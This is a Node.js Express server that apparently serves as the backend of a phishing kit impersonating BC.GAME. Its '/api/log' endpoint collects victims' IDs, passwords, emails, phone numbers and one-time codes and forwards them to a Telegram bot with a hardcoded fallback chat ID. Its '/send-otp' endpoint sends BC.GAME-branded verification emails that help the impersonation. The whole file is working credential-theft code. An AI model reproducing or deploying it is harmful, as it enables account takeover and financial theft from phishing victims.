require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

console.log('🚀 Server starting with config:');
console.log('Email User:', process.env.EMAIL_USER);
console.log('SMTP Port:', process.env.SMTP_PORT);
console.log('Log Bot Token:', process.env.LOG_BOT_TOKEN ? 'SET' : 'MISSING');
console.log('Chat ID:', process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID || 'MISSING');

// API Endpoints
app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    console.log(`[LOG] Hit: ${title}`);
    
    const token = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
    const chatId = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID || '1661187898';

    if (!token || !chatId) return res.status(500).json({ success: false, message: 'Bot config missing' });

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>ID</b>: <code>${data.id}</code>
🔑 <b>Pass</b>: <code>${data.pass}</code>
📧 <b>Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>E-OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
📱 <b>Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId.trim(),
            text: message,
            parse_mode: 'HTML'
        });
        console.log('[LOG] Sent to Telegram');
        res.json({ success: true });
    } catch (e) {
        console.error("[LOG] Telegram Error:", e.response?.data || e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

app.post('/send-otp', async (req, res) => {
    const { email } = req.body;
    console.log(`[OTP] Request for: ${email}`);

    if (!email) return res.status(400).json({ success: false });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    const transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST || 'smtp.gmail.com',
        port: parseInt(process.env.SMTP_PORT) || 465,
        secure: (process.env.SMTP_PORT == '465'),
        auth: {
            user: process.env.SMTP_USER || process.env.EMAIL_USER,
            pass: process.env.SMTP_PASS || process.env.EMAIL_PASS
        }
    });

    try {
        await transporter.sendMail({
            from: process.env.SMTP_FROM || `"BC.GAME" <${process.env.EMAIL_USER}>`,
            to: email,
            subject: '🔐 Verification Code',
            html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; text-align:center; border:2px solid #3bc117; font-family:sans-serif;">
                    <h1 style="color:#3bc117;">BC.GAME</h1>
                    <p style="font-size:18px;">Your verification code is: <b style="font-size:32px; color:#3bc117;">${otp}</b></p>
                   </div>`
        });
        console.log('[OTP] Email Sent Successfully');
        res.json({ success: true });
    } catch (e) {
        console.error("[OTP] SMTP Error:", e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

app.use(express.static(__dirname));

app.use((req, res, next) => {
    if (req.method === 'GET' && !req.path.includes('.')) {
        res.sendFile(path.join(__dirname, 'index.html'));
    } else {
        next();
    }
});

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    app.listen(port, () => console.log(`🚀 Server on port ${port}`));
}

module.exports = app;
